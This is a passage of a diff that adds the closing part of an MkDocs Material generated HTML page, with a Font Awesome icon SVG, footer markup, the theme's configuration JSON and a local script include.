+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 6.7.1 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M416 32H31.9C14.3 32 0 46.5 0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6 0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3M135.4 416H69V202.2h66.5V416zm-33.2-243c-21.3 0-38.5-17.3-38.5-38.5S80.9 96 102.2 96c21.2 0 38.5 17.3 38.5 38.5 0 21.3-17.2 38.5-38.5 38.5m282.1 243h-66.4V312c0-24.8-.5-56.7-34.5-56.7-34.6 0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5 67.2 0 79.7 44.3 79.7 101.9z"/></svg>
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    <script id="__config" type="application/json">{"base": "../../..", "features": ["content.code.annotate", "content.code.copy", "navigation.footer", "navigation.indexes", "navigation.sections", "navigation.tabs", "navigation.top", "navigation.tracking", "search.suggest", "toc.follow"], "search": "../../../assets/javascripts/workers/search.6ce7567c.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
+    
+    
+      <script src="../../../assets/javascripts/bundle.83f73b43.min.js"></script>
+      
+    
+  </body>
+</html>
